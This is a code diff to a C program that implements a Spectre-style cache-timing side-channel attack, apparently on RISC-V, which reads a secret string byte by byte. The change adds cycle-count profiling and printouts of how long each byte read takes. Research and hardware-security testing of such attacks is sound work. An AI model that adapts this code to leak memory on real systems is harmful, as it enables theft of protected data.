@@ -68,11 +68,14 @@ int main(void){
     uint64_t start, diff, passInAddr;
     uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
     uint64_t passInIdx, randIdx;
+    uint64_t profile_start, profile_diff;
     uint8_t dummy = 0;
     static uint64_t results[256];
 
     // try to read out the secret
     for(uint64_t len = 0; len < SECRET_SZ; ++len){
+
+        profile_start = rdcycle();
 
         // clear results every round
         for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
@@ -81,6 +84,7 @@ int main(void){
 
         // run the attack on the same idx ATTACK_SAME_ROUNDS times
         for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
+
 
             // make sure array you read from is not in the cache
             flushCache((uint64_t)array2, sizeof(array2));
@@ -133,7 +137,15 @@ int main(void){
                     results[i] += 1;
                 }
             }
+
+            //profile_diff = rdcycle() - profile_start;
+            //printf("Read time: (byteIdx, atkRnd, cycle) (%lu, %lu, %lu)\n", len, atkRound, profile_diff);
+            //printf("Read time: (byteIdx, cycle) (%lu, %lu)\n", len, profile_diff);
         }
+
+        profile_diff = rdcycle() - profile_start;
+        //printf("Read time: (byteIdx, atkRnd, cycle) (%lu, %lu, %lu)\n", len, atkRound, profile_diff);
+        printf("Read time: (byteIdx, cycle) (%lu, %lu)\n", len, profile_diff);
         
         // get highest and second highest result hit values
         uint8_t output[2];
